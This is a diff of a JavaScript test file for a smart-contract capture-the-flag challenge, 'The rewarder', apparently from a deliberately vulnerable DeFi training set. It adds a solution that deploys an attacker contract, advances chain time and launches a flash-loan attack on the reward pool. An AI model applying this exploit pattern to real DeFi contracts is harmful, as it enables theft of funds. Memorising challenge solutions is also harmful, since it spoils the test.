@@ -42,7 +42,7 @@ describe('[Challenge] The rewarder', function () {
             await liquidityToken.connect(users[i]).approve(rewarderPool.address, depositAmount);
             await rewarderPool.connect(users[i]).deposit(depositAmount);
             expect(
-                await accountingToken.balanceOf(users[i].address)
+                await accountingToken.balanceOf(users[i].address) // accounting token matches liquidity token deposited
             ).to.be.eq(depositAmount);
         }
         expect(await accountingToken.totalSupply()).to.be.eq(depositAmount * BigInt(users.length));
@@ -65,11 +65,18 @@ describe('[Challenge] The rewarder', function () {
         expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
         
         // Two rounds must have occurred so far
-        expect(await rewarderPool.roundNumber()).to.be.eq(2);
+        expect(await rewarderPool.roundNumber()).to.be.eq(2); // it starts in 1 in the constructor
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const attacker = await (await ethers.getContractFactory('TheRewarderAttacker', player)).deploy(rewarderPool.address)
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        await attacker.connect(player).attack(flashLoanPool.address, TOKENS_IN_LENDER_POOL)
     });
 
     after(async function () {
